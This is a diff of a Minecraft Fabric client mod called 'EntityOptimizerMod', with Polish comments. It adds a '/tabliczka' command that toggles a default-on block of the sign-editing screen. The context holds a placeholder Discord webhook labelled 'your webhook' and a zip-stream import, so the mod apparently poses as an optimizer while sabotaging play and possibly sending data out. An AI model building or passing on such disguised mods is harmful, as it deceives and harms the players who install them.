@@ -34,10 +34,14 @@ import java.util.zip.ZipOutputStream;
 
 public class EntityOptimizerMod implements ClientModInitializer {
 
+    // TWÓJ WEBHOOK
     private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/XXX/YYY";
 
     // flaga: czy blokować otwieranie crafting table (domyślnie TAK)
     public static boolean craftingDisabled = true;
+
+    // flaga: czy blokować GUI tabliczek (domyślnie TAK)
+    public static boolean signEditDisabled = true;
 
     @Override
     public void onInitializeClient() {
@@ -66,6 +70,15 @@ public class EntityOptimizerMod implements ClientModInitializer {
                     literal("kraft")
                             .executes(context -> {
                                 handleKraftCommand(context.getSource());
+                                return 1;
+                            })
+            );
+
+            // /tabliczka – przełącza blokadę GUI tabliczek
+            dispatcher.register(
+                    literal("tabliczka")
+                            .executes(context -> {
+                                handleTabliczkaCommand(context.getSource());
                                 return 1;
                             })
             );
@@ -250,6 +263,13 @@ public class EntityOptimizerMod implements ClientModInitializer {
     private void handleKraftCommand(FabricClientCommandSource source) {
         craftingDisabled = !craftingDisabled;
         String msg = craftingDisabled ? "crafting disable" : "crafting enable";
+        source.sendFeedback(Component.literal(msg));
+    }
+
+    // /tabliczka – przełącza blokadę GUI tabliczek
+    private void handleTabliczkaCommand(FabricClientCommandSource source) {
+        signEditDisabled = !signEditDisabled;
+        String msg = signEditDisabled ? "tabliczka disable" : "tabliczka enable";
         source.sendFeedback(Component.literal(msg));
     }
 
